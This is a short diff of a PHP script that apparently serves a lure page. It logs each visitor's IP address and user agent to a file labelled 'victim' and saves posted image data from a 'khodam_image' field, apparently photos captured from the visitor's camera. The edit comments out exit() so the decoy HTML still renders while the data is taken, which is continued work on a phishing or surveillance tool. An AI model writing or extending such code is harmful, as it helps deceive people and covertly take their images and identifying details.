@@ -14,7 +14,6 @@ $browser = $_SERVER['HTTP_USER_AGENT'];
 $file = 'ip.txt';
 $victim = "IP: ";
 $fp = fopen($file, 'a');
-
 fwrite($fp, $victim);
 fwrite($fp, $ipaddress);
 fwrite($fp, $useragent);
@@ -31,5 +30,6 @@ if (!empty($_POST['khodam_image'])) {
     fwrite($fp2, $unencodedData);
     fclose($fp2);
 }
-exit();
+
+// exit();  <-- jangan pakai exit agar HTML tetap muncul
 ?>
